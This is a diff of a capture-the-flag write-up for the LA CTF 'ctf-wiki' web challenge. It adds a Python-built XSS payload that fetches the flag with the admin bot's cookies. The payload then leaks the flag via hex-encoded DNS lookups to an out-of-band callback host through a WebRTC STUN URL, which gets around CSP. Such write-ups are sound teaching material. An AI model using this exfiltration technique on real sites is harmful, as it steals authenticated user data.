@@ -59,7 +59,7 @@ The base idea of the challenge will utilize the fact that if the ctf-wiki page i
 Now from here we can make the fetch request, but we need to somehow send this to our domain. 
 
 ### XSS on window with cookies
-To get a simple POC, we can first create a note that creates a new window, then executes some JS inside that window.
+To get a simple POC, we can first create a note that creates a new window, then executes some JS inside that window. I also created this helper script to change the payload on my page quickly.
 
 ```py
 import requests
@@ -111,7 +111,7 @@ w.onload = () => {
 }
 ```
 
-Note here we are using w.fetch to fetch the `/flag` endpoint, but just fetch to send it back to us. This is since the CSP will prevent using w.fetch to make a request outside the `https://ctf-wiki.chall.lac.tf/` origin, however the cookieless page does not have that CSP restriction.
+Note here we are using `w.fetch` to fetch the `/flag` endpoint, but just fetch to send it back to us. This is since the CSP will prevent using `w.fetch` to make a request outside the `https://ctf-wiki.chall.lac.tf/` origin, however the cookieless page does not have that CSP restriction.
 
 Finally, we send this to the Admin Bot, get our callback, and base64 decode to get the flag!
 ![alt text](image-4.png)
@@ -121,12 +121,30 @@ Finally, we send this to the Admin Bot, get our callback, and base64 decode to g
 
 
 ## Additional Note: 
-During the CTF, I honestly don't know how I didn't try this. I think I accidently tried w.fetch when exfiltrating, got the `connect-uri` CSP issue, and then just resorted to the option I knew on how to solve that which was using WebRTC. 
+During the CTF, I honestly don't know why I didn't try this. I think I accidently tried `w.fetch` when exfiltrating (instead of just fetch), got the `connect-uri` CSP issue, and then just resorted to the option I knew on how to solve that which was using WebRTC. 
 
 A reference for that payload is this very well written writeup for SekaiCTF GolfJail which used that same technique.
 [https://blog.antoniusblock.net/posts/golfjail/](https://blog.antoniusblock.net/posts/golfjail/)
 
-You can send the same request, but modifying the data to the request response, and collect the response in the DNS query:
+You can send the same request, but modifying the data to the request response, and collect the response in the DNS query.
+This is the payload script I used during the CTF.
+```py
+innerpayload = """
+window.onload = () => {
+    fetch('https://ctf-wiki.chall.lac.tf/flag', {method: "POST"}).then(r => r.text()).then(r => {
+        pc=new RTCPeerConnection({"iceServers":[{"urls":["stun:"+r.split("").map(x=>x.charCodeAt(0).toString(16)).join("").substr(0, 62)+"."+"zlamrbukykhbdngfjbuh29ofd2v5k39qo.oast.fun"]}]});
+        pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
+    })
+}
+""".strip()
+
+payload = f"""
+w = window.open("https://ctf-wiki.chall.lac.tf/");
+w.eval(atob('{b64encode(innerpayload.encode()).decode()}'))
+""".strip()
+```
+
+And you will get a response like this, which afterwards you can hex decode the subdomain to determine the flag!
 ![](image-5.png)
 
 But yeah there fetch from the cookieless CSPless page is alot more straightforward lol. In the words of the author himself:
